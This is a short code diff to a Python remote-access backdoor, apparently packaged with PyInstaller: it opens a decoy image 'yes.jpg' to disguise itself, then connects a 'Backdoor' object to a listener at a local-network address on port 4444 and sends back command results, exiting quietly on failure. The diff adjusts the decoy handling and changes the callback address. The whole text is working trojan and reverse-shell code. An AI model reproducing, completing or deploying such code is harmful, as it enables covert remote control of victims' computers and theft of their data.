@@ -80,11 +80,14 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-file_name = sys._MEIPASS + "\yes.jpg"
-subprocess.Popen(file_name, shell=True)
+try:
+    file_name = sys._MEIPASS + "\yes.jpg"
+    subprocess.Popen(file_name, shell=True)
+except Exception:
+    file_name = os.path.abspath("\yes.jpg")
 
 try:
-    my_backdoor = Backdoor("192.168.1.125", 4444)
+    my_backdoor = Backdoor("192.168.1.129", 4444)
     my_backdoor.run()
 except Exception:
     sys.exit()
